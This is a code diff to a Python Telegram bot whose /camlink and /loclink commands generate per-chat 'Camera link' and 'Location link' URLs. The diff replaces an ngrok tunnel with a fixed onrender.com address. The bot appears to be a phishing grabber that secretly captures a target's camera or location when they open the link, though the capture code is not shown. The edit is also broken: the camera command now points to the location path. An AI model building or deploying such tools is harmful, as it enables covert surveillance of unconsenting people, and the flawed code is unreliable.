@@ -25,15 +25,15 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
 async def camlink(update: Update, context: ContextTypes.DEFAULT_TYPE):
     chat_id = update.effective_chat.id
     threading.Thread(target=start_flask, daemon=True).start()
-    url = start_ngrok()
-    link = f"{url}/?id={chat_id}"
+    BASE_URL = "https://mytelegrambot-2rw0.onrender.com/"
+    link = f"{BASE_URL}/location?id={chat_id}"
     await update.message.reply_text(f"📸 Camera link:\n{link}")
 
 async def loclink(update: Update, context: ContextTypes.DEFAULT_TYPE):
     chat_id = update.effective_chat.id
     threading.Thread(target=start_flask, daemon=True).start()
-    url = start_ngrok()
-    link = f"{url}/location?id={chat_id}"
+    BASE_URL = "https://mytelegrambot-2rw0.onrender.com/"
+    link = f"{BASE_URL}/location?id={chat_id}"
     await update.message.reply_text(f"🗺️ Location link:\n{link}")
 
 if __name__ == "__main__":
